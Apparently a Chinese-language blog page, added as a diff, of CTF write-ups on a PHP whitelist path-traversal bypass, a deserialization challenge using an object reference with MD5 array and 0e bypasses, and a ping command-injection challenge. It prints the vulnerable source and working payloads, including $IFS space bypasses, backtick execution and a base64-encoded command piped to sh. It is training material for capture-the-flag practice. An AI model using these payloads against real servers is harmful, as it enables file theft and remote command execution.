@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="yanm1ng&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      序列化与反序列化 | Hexo
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+  
+    
+<script src="/js/local-search.js"></script>
+
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>Hexo</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/series/" class="item-link">Series</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+      
+        <li class="menu-item menu-item-search right-list">
+    <a role="button" class="popup-trigger">
+        <i class="fa fa-search fa-fw"></i>
+    </a>
+</li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/series/" class="menu-link">Series</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+    
+      <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+            <span class="search-icon">
+                <i class="fa fa-search"></i>
+            </span>
+            <div class="search-input-container">
+                <input autocomplete="off" autocapitalize="off"
+                    placeholder="Please enter your keyword(s) to search." spellcheck="false"
+                    type="search" class="search-input">
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa fa-times-circle"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+    
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>序列化与反序列化</h2>
+  <p class="post-date">2022-03-31</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><p>以下主要内容为序列化与反序列化，同时也包含其他的部分知识。</p>
+<span id="more"></span>
+<h4 id="Warmup">Warmup</h4>
+<p>开始是一张滑稽的图片，我们知道这是一道代码审计的题目，先用御剑扫描目录。</p>
+<p>source.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#x27;file&#x27;])  ##不能为空</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])  ##是字符串</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])  ##上面checkfile返回为true</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#x27;file&#x27;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>hint.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<p>相关函数：</p>
+<p><strong>isset函数</strong></p>
+<p>用于检测变量是否已设置并且非NULL</p>
+<p><strong>is_string函数</strong></p>
+<p>用于检测变量是否是字符串。</p>
+<p><strong>is_array函数</strong></p>
+<p>is_array(a,b)  查找b中是否包含a的值。</p>
+<p><strong>mb_substr函数</strong></p>
+<p>substr(a,b,c) <strong>select substr(a,b,c)=‘’；</strong> substr(a,b,c)从位置b开始，截取a字符串c位长度。</p>
+<p>mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr().</p>
+<p><strong>mb_strpos函数</strong></p>
+<p>mb_strpos(a,b)  返回b字符串在a中出现的首个位置。</p>
+<p>中文查找中，尽量要声明一下页面的编码为UTF-8</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Content–type:text/html;chartset=utf-8&quot;); </span><br></pre></td></tr></table></figure>
+<p>理一下<code>source.php</code>代码的逻辑：</p>
+<ol>
+<li>定义了一个白名单：source.php和hint.php，判断$page是否为空、是否为字符串。</li>
+<li>判断$page是否在白名单里，若存在返回true；</li>
+<li>$_page是取出$page问号前的东西，然后再判断$_page是否在白名单里，若存在则返回true；</li>
+<li>如果上一步判断失败，则又考虑了url编码的问题，因为url在传入以后服务器会自动进行一次解码。因此传入二次编码后的内容，就可以使checkfile返回true。</li>
+</ol>
+<p><code>$_REQUEST</code>全局变量，<code>emmm::checkFile($_REQUEST['file'])</code>这里将我们的的值传到emmm类里面的checkFile函数.</p>
+<p><strong>payload</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file=hint.php?/../../../../../../../../ffffllllaaaagggg</span><br><span class="line">file=hint.php%253f/../../../../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<p><code>UrlEncode</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25 -&gt; %  ;  %3f -&gt; ?</span><br></pre></td></tr></table></figure>
+<h4 id="CODE-REVIEW">CODE REVIEW</h4>
+<p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: jinzhao</span><br><span class="line"> * Date: 2019/10/6</span><br><span class="line"> * Time: 8:04 PM</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class BUU &#123;</span><br><span class="line">   public $correct = &quot;&quot;;</span><br><span class="line">   public $input = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">   public function __destruct() &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           $this-&gt;correct = base64_encode(uniqid());</span><br><span class="line">           if($this-&gt;correct === $this-&gt;input) &#123;</span><br><span class="line">               echo file_get_contents(&quot;/flag&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; catch (Exception $e) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_GET[&#x27;pleaseget&#x27;] === &#x27;1&#x27;) &#123;</span><br><span class="line">    if($_POST[&#x27;pleasepost&#x27;] === &#x27;2&#x27;) &#123;</span><br><span class="line">        if(md5($_POST[&#x27;md51&#x27;]) == md5($_POST[&#x27;md52&#x27;]) &amp;&amp; $_POST[&#x27;md51&#x27;] != $_POST[&#x27;md52&#x27;]) &#123;</span><br><span class="line">            unserialize($_POST[&#x27;obj&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>uniqid函数</strong></p>
+<p>uniqid()函数基于以微秒计的当前时间，生成一个唯一的 ID。</p>
+<h5 id="serialize和unserialize"><strong>serialize和unserialize</strong></h5>
+<p>序列化与反序列化，这是我们代码审计的一个重点。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">serialize()</span><br><span class="line">当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。</span><br><span class="line">unserialize()</span><br><span class="line">和序列化的serialize()刚刚好相反，是将字符串转化为对象</span><br></pre></td></tr></table></figure>
+<p>具体说说serialize()将对象转换为字符串的具体方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">class chybeta&#123;</span><br><span class="line">var $test = &#x27;123&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$class1 = new chybeta;</span><br><span class="line">$class1_ser = serialize($class1);</span><br><span class="line">echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">print_r($class1_ser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>O:7:“chybeta”:1:{s:4:“test”;s:3:“123”;}</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">这串字符的含义：变量类型；</span><br><span class="line">类名长度；类名；属性变量</span><br><span class="line">&#123;属性类型；属性名长度；属性名；属性值类型；属性值长度；属性值内容&#125;</span><br><span class="line">o  表示object对象</span><br><span class="line">7   表示对象名称有7个字符</span><br><span class="line">chybeta 对象名称</span><br><span class="line">1  表示只有一个值</span><br><span class="line">s 表示 string 字符串  </span><br><span class="line">4  表示test  字符串长度</span><br></pre></td></tr></table></figure>
+<p>类似的，针对这道题，我们挑出部分反序列的代码来看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class BUU &#123;</span><br><span class="line">   public $correct = &quot;&quot;;</span><br><span class="line">   public $input = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">   public function __destruct() &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           $this-&gt;correct = base64_encode(uniqid());</span><br><span class="line">           if($this-&gt;correct === $this-&gt;input) &#123;</span><br><span class="line">               echo file_get_contents(&quot;/flag&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; catch (Exception $e) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在序列化的时候，我们会发现一个问题，即由于<code>uniqid</code>在微秒的时间内总会产生一个随机的ID，是无法预测的，所以要得到<code>input</code>的值显然不是像<code>correct</code>直接就可以看出来，这里涉及到引用的反序列化问题，我们可以简单的把引用简单的理解为<code>C</code> 语言中的地址指针。</p>
+<p>参考如下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=&amp;$b;</span><br><span class="line">$a=1;//此时 输出$b 那么变量b就为1</span><br><span class="line">$a=123;//此时输出$b 那么变量b就为123</span><br></pre></td></tr></table></figure>
+<p>由以上代码可以发现，当变量b为a的引用的时候，b的值随a变化。</p>
+<p>所以要得到<code>input</code>的值，只需要<code>$this-&gt;input</code> 为 <code>$this-&gt;correct</code> 的引用即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;input=&amp;$this-&gt;correct</span><br></pre></td></tr></table></figure>
+<p>我们可以借用<code>php在线运行</code>进行序列化，如下图：</p>
+<p><img src="/2022/03/31/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/k.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>
+<p>再回头看代码获得flag的要求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if($_GET[&#x27;pleaseget&#x27;] === &#x27;1&#x27;) &#123;</span><br><span class="line">    if($_POST[&#x27;pleasepost&#x27;] === &#x27;2&#x27;) &#123;</span><br><span class="line">        if(md5($_POST[&#x27;md51&#x27;]) == md5($_POST[&#x27;md52&#x27;]) &amp;&amp; $_POST[&#x27;md51&#x27;] != $_POST[&#x27;md52&#x27;]) &#123;</span><br><span class="line">            unserialize($_POST[&#x27;obj&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>前面部分的都比较直白，后面除了涉及到反序列化，还有md5绕过，这部分的内容早在之前就学到过了，我们主要是用<code>0e绕过</code>和<code>数组绕过</code>，这里就不多赘述，具体可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/119845182">文章链接</a></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?pleaseget=1</span><br><span class="line">pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/03/31/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/88.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?pleaseget=1</span><br><span class="line">pleasepost=2&amp;md51=QNKCDZO&amp;md52=240610708&amp;obj=O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/03/31/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/89-16463164740741.png" alt></p>
+<p>需要注意的是0e绕过只能绕过弱类型比较(==),而数组绕过不只可以绕过弱类型比较,还可以绕过强类型比较(===)</p>
+<h4 id="ping-ping-ping">ping ping ping</h4>
+<p><img src="/2022/03/31/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/o.png" alt></p>
+<p>整理出本题的考点：</p>
+<h5 id="命令联合执行">命令联合执行</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">;     前面的执行完执行后面的</span><br><span class="line">|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         </span><br><span class="line">||    当前面的执行出错时（为假）执行后面的</span><br><span class="line">&amp;     将任务置于后台执行</span><br><span class="line">&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真</span><br><span class="line">%0a  （换行）</span><br><span class="line">%0d  （回车）</span><br></pre></td></tr></table></figure>
+<h5 id="命令绕过空格的方法">命令绕过空格的方法</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;$9</span><br><span class="line">&#123;IFS&#125;</span><br><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class="line">IFS</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20   (space)</span><br><span class="line">%09   (tab)</span><br><span class="line">X=$&#x27;cat\x09./flag.php&#x27;;$X       （\x09表示tab，也可以用\x20）</span><br><span class="line"></span><br><span class="line">ps:有时会禁用cat:</span><br><span class="line">解决方法是使用tac反向输出命令：</span><br><span class="line">linux命令中可以加\，所以甚至可以ca\t /fl\ag</span><br></pre></td></tr></table></figure>
+<h5 id="内联执行">内联执行</h5>
+<p>内联，就是将反引号内的命令的输出作为输入执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br><span class="line"></span><br><span class="line">$IFS在Linux下表示为空格</span><br><span class="line">$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字</span><br><span class="line"></span><br><span class="line">这里$IFS$9或$IFS垂直，后面加个$与&#123;&#125;类似，起截断作用</span><br></pre></td></tr></table></figure>
+<p>ping到本地网站，用ls看看都有什么文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;ls</span><br><span class="line">?ip=127.0.0.1|ls</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/03/31/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/p.png" alt></p>
+<p>flag应该在<code>flag.php</code>的文件里面，使用cat</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat flag.php</span><br></pre></td></tr></table></figure>
+<p><code>/?ip= fxck your space!</code>，空格被过滤了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat&#123;IFS&#125;flag.php</span><br></pre></td></tr></table></figure>
+<p><code>/?ip= 1fxck your symbol!</code>，括号被过滤了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFSflag.php</span><br></pre></td></tr></table></figure>
+<p><code>/?ip= fxck your flag!</code>，flag不可读，试试看index.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$1index.php</span><br></pre></td></tr></table></figure>
+<p>可以看到<code>index.php</code>的源码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">/?ip=</span><br><span class="line">|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看出过滤的都有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp; / ？ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#x27; &quot; \ () [] &#123;&#125;  空格</span><br><span class="line">&quot;xxxfxxxlxxxaxxxgxxx&quot; &quot; &quot; &quot;bash&quot; </span><br></pre></td></tr></table></figure>
+<p>flag的贪婪匹配，匹配一个字符串中，是否按顺序出现过flag四个字母。并且由于过滤了一些字符，所以类似<code>fl&quot;ag</code>等方法都不适用。按顺序这个字眼很重要，那我们是否可以借用<code>&amp;a</code>这个变量来改变flag的顺序。</p>
+<p>但是类似<code>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code>，这样的输入方法，要么就是没flag，要么就是被过滤了。</p>
+<p>注意到还有一个被过滤的bash，bash是shell的一种，其他的shell还有：sh、bash、ksh、rsh、csh等。</p>
+<p>另一种方法：</p>
+<p>cat flag.php用base64加密来绕过正则匹配。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
+<p>在linux下可用<code>sh</code>来替代<code>bash</code>。</p>
+<p>下面是大佬整理出的类似题目的解题方法。</p>
+<h4 id="cat绕过">cat绕过</h4>
